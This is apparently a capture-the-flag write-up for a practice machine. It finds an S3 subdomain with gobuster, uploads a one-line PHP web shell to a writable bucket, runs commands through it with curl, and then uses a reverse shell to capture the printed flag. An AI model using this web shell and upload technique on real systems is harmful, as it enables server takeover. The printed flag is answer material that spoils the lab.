We will use `gobuster` to discover sub-domain

`gobuster dns -d thetoppers.htb -t 50 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt`

Cheatsheet (https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/#dir-mode)

```
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     thetoppers.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: s3.thetoppers.htb
                                                                                                                    
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

## AWS

to list all the S3 bucket

`aws s3 ls`

`aws --endpoint=http:http://s3.thetoppers.htb/ s3 ls s3://thetoppers.htb`

We can then see the list of s3 bucket

```
                           PRE images/
2023-10-13 10:25:08          0 .htaccess
2023-10-13 10:25:08      11952 index.php

```

We then create a `PHP` file with a `cmd` command inside, it will looks like this.

`<?php system($_REQUEST["cmd"]); ?>`

We then upload it to the S3 bucket

`aws --endpoint=http://s3.thetoppers.htb/ s3 cp shell.php s3://thetoppers.htb`

Confirmation

`upload: ./shell.php to s3://thetoppers.htb/shell.php `

We then check the bucket again using the `ls` command

`
└─# aws --endpoint=http://s3.thetoppers.htb/ s3 ls s3://thetoppers.htb          
                           PRE images/
2023-10-13 10:25:08          0 .htaccess
2023-10-13 10:25:08      11952 index.php
2023-10-13 11:06:49         31 shell.php
`
We will now execute and see if our php shell works.

`curl http://thetoppers.htb/shell.php?cmd=id`

Result:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

It works!

We then upload a php reverse shell. (note: you can use a bash script or command to initiate a reverse shell.

We will use the pentestmonkey php.

Then on our machine, we will open a listener.

and upload the reverse shell php using the aws upload command again and execute it.

we should receive our shell and retrieve the flag.

`www-data@three:/var/www$ cat flag.txt
cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
www-data@three:/var/www$ 
`

